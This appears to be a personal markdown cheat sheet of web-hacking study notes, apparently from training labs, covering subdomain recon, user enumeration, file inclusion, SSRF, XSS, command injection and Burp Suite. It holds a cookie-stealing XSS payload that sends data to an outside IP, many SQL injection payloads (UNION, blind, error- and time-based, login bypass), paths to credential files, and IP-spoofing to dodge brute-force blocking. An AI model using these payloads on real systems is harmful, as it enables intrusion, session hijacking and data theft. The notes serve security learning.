- [Web hacking](#web-hacking)
  - [Subdomain](#subdomain)
  - [Wildcards](#wildcards)
  - [User enumeration](#user-enumeration)
  - [IDOR](#idor)
  - [File inclusion](#file-inclusion)
  - [SSRF](#ssrf)
  - [XSS](#xss)
  - [Command injection](#command-injection)
  - [Authentication](#authentication)
  - [database](#database)
    - [Steps](#steps)
    - [UNION](#union)
      - [Find data oracle](#find-data-oracle)
    - [blind](#blind)
      - [binary](#binary)
        - [sqlmap](#sqlmap)
        - [Provoking errors](#provoking-errors)
      - [Time](#time)
- [Burpsuite](#burpsuite)
  - [Repeater](#repeater)
  - [Intruder](#intruder)
    - [Macros](#macros)
  - [Decoder, Comparer, Sequencer](#decoder-comparer-sequencer)

# Web hacking
## Subdomain
- search certificates: 
  - https://transparencyreport.google.com/https/overview
  - https://crt.sh/
    - $ curl -s "https://crt.sh/?q=%.<domain>&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-crtsh.txt
    - curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-certspotter.txt
- Google search engine: site:*.domain.com
- dnsrecon
- dnsdumpster => online

## Wildcards 
- A lot of false positive
- need to be filtered
- dig domain.de A,CNAME {test321123,testingforwildcard,plsdontgimmearesult}.<domain> +short | wc -l ===> > 1, a lot of false positive from brute force


- OWAPS *Amass*: amass -src -ip -active -brute -d
  - https://github.com/OWASP/Amass/blob/master/doc/tutorial.md
  - amass -passive -d domain.de -src
  - $ amass enum -active -d owasp.org -brute -w /root/dns_lists/deepmagic.com-top50kprefixes.txt -src -ip -dir amass4owasp -config /root/amass/config.ini -o amass_results_owasp.txt
  - https://medium.com/@noobhax/my-recon-process-dns-enumeration-d0e288f81a8a

- Create wordlist (from commands above)
  - sed 's/$/.<domain>/' subdomains-top1mil-20000.txt > hosts-wordlist.txt
  
## User enumeration
-  fuff -w [wordlist] -X [Method] -d " username=FUZZ& data to be sent" -H "additional header request" -u "url" -mr "we are looking for this answer / match regex"
   -  the *FUZZ* will be replaced by the items in the wordlist

- ffuf -w [Wordlist1]:KeyWord1 , [Wordlist2]:KeyWord2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-w  ww-form-urlencoded" -u http://10.10.1.70/customers/login -fc 200j@fakemail.thm"
- https://tryhackme.com/room/authenticationbypass

## IDOR
Insecure Direct Object Request

## File inclusion
- insecure input validation
- path traversal: ../../../etc/passwd
- Important files
  - /etc/issue - system identification
  - /etc/profile - default variables terminal
  - /proc/version - kernen versel
  - /etc/shadow - users password
  - /root/.bash_history
  - /var/log/dmessage
  - /root/.ssh/id_rsa = private rsa key
  - /var/log/apache2/access.log
  - C:\boot.ini (windows)

- null byte = %00, injection (terminate string)
- curl -X METHOD -d [data]
- magic numbers
- double extension
- exiftools -Comment=PAYLOAD picture.jgp.php ==> Comments!!!

## SSRF
- Server-Side Request Forgery
- Where? 
  - Full Paramter in the address bar ("value="http..../name")
  - partial URL
  - Blind: requestbin.com
  - ../ => directory trasversal
  - &x= ==> ignore everything that comes after that

## XSS
- Cross-Site Scripting
- test: parameters, URL File Path, HTTP Headers
- in js onload event within a tag
- Polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
- Payload for shell: </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
-                    </textarea><script>fetch('http://10.8.80.130:1234?cookie=' + btoa(document.cookie) );</script> 

## Command injection
- blind: no output, test with ping/sleep/timeout(win) || force output > etwas
  - curl http://website/command
- verbose: output/feedback
- $payload = "\x2f\x65\x74\x2f\x70\x61\x73\x73\x77\x64"

## Authentication
- Brute force: 
  - in Header ==> **X-Forwarded-For**: [IP] ==> avoid IP blocking
  - intercalate correct login AND brute force (intruder)

- Blocked account
  - enumerate username until valid one ==> NULL payload for password + several tries until get different response
  - try password with these usernames ==> grep warning for incorrect passwords

## database
### Steps
- find vulnerability: ', "
- find total columns: UNION SELECT NULL,NULL,NULL
- find name of db: UNION SELECT NULL,NULL,database()
- find tables: UNION SELECT NULL,NULL,table_name from **information_schema.tables** WHERE table_schema = 'DB name'
- find columns in table: UNION SELECT NULL,NULL,column_name FROM **information_schema.columns** WHERE table_name= 'Table name'
- find data: UNION SELECT NULL,NULL,group_concat(column,column,column) from table_nae

- Column_name known
  - aa' field=(COMMAND),field='

- Bypass login: 
  - admin'-- [everything here is a comment and will be ignored]
  - or 1 = 1'-- ==> will always return true
  - header:  X-Forwarded-For: IP

### UNION
- join two or more tables + number o columns and data type muss be equal
- 'UNION SELECT NULL,NULL...-- - ==> until success to find number of columns
  - NULL = compatible with all data type
- 'UNION SELECT column1,column2 FROM table_name-- -
- find db = '0 union 1,2,database()-- -
- find tables = '0 union select  1,2,group_concat(table_name) FROM information_schema.tables where table_schema='db_name'
  -  information_schema = info about all databases and tables
- find columns: 0 union select  1,2,group_concat(column_name) FROM information_schema.columns where table_name= 'table_name'-- -
- content: '0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

- SQLITE 
  - exist vuln: ' UNION SELECT 1,2'
  - find tables: ' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT LIKE 'sqlite_%''
  - find columns: ' UNION SELECT 1,group_concat(column_name) FROM table_name '
  - find content: ' UNION SELECT 1,group_concat(column1 || '-' || column2) FROM table_name '
  
- Find version (always UNION)
  - Microsoft, MySQL	SELECT @@version
  - Oracle	SELECT * FROM v$version
  - PostgreSQL	SELECT version()


#### Find data oracle
Oracle DB: '+UNION+SELECT+NULL,NULL+FROM+v$version--
2 Columns strings: '+UNION+SELECT+'abc','abc'+FROM+v$version--
Show tables: '+UNION+SELECT+table_name,+NULL+FROM+all_tables-- 
Show columns: '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='table_name'
Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table-- 

### blind
- Change SQL Command in the trackinID + test
- Table exists: ' AND (SELECT 'a' FROM users LIMIT 1)='a;
- Size of string: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a;==> payload type number to find 1 until n
  - admin' AND length((SELECT password from users where username='admin'))==37-- -
  
- Getting data string per string:
  - SELECT column FROM table_name LIMIT 0,1-- - //
    - LIMIT start,from_total ==> LIMIT 0,1 = first, from total 1 || LIMIT 0,2 start 0 from total 2
  - SUBSTRING((SELECT column FROM table_name LIMIT 0,1)0,1)

#### binary
- like a% = starting with a
- Find DB name: ' UNION SELECT, NULL,NULL,NULL where database() like '%a' 
- Find table name: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.tables** WHERE **table_schema**='name_db' AND **table_name** like '[]%';--
- find columns 1: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%';--
- find columns 2: ' UNION SELECT NULL,NULL,[sleep(4)]|NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%' AND column_name!='found 1';--
- find content: ' UNION SELECT NULL,NULL,NULL FROM **table_name** where **column_1** like 'a%';--

- individual charachter + size
  - ' AND (SELECT 'a' FROM [table]  WHERE [column]='value' AND LENGTH(value)>§1§)='a;==> payload type number to find 1 until n
  -(SQLITE): [known_value]' AND length((SELECT [column] FROM [table] WHERE [column]='value'))==37-- -
 - find substring SQLITE: admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
 
 ##### sqlmap
- sqlmap
  - -u = url
  - --data="id=123&password=123"
  - --level= ??
  - --risk= ??
  - --dbms=type of db
  - --technique=???
  - --dumb

##### Provoking errors
- Oracle
  - xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    - case = false  ==> no error produced
    - TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' = FALSE ==> execute after ELSE query
      - Condition = TRUE ==> forced error 1/0
      - Condition = FALSE ==> goes to 2nd question and asks if the info about the db is correct

  - xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
    - case = true ==> error will be produced
    - TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' = TRUE ==> produce error that is processed by the query

#### Time
- with sleep() ==> success if the function is executed
- admin123' UNION SELECT SLEEP(5),1,x,y,z;--
- similar to blind
- admin123' UNION SELECT 1,SLEEP(5) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password%' and COLUMN_NAME!='username';--
  
- Microsoft: 
 - '; IF (1=2) WAITFOR DELAY '0:0:10'-- = false, will springt action
 - '; IF (1=1) WAITFOR DELAY '0:0:10'-- = true, action

- PostgreSQL:
  - ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--

- in the intruder: substring method with password list
' AND (SELECT SUBSTRING(password,X,1) FROM users WHERE username = 'administrator')='§a§;
 - SUBSTRING(string, start, length)
 - Cluster Bomb: several $payload$, one for the position_number, one for the string
 - Brute_force: iterate over given list

- Known table, columns:
  - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where *column* like '[character]%';--
  - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where username='[name]' and password like 'a%';--


admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
admin123' UNION SELECT SLEEP(5),2;--

# Burpsuite

## Repeater
- manipulate the request
- check response
- 
## Intruder
- brute force and fuzzing
- Positions: where to insert payload
- Attack types 
  - **sniper**: one set of payload (wordlist) / i.g. username/password
  - **battering ram**: same payload in every position
  - **pitchfork**: several sniper at the same time, one payload per position. For credentials
  - **Clusterbomb**: multiple payload, individual iteration, every combination

- Payload: define list file, regex or other condition
- Filtering results: 
  - status (200, 401, 302)
  - size: sucess 400 bytes, failed 600 bytes

- CSRF Token: 
  - token changed by every update of the page
  - define macros
  
### Macros
- Repeated actions
- project options + add + selection action to be done
- Session handling rule: select macro + select where to do it (intruder, repeater, target) + update only "name of the field", 

## Decoder, Comparer, Sequencer
- Decoder
  - Encode e decode data
  - hashsums, ASCII, binary, hexa, etc

- Comparer
  - compare data
  - compare responses after logins attempt

- Sequencer
  - measure entropy of tokens
  - analyze after an amount of tokens
  - Auto Analyze = capture every 2000 requests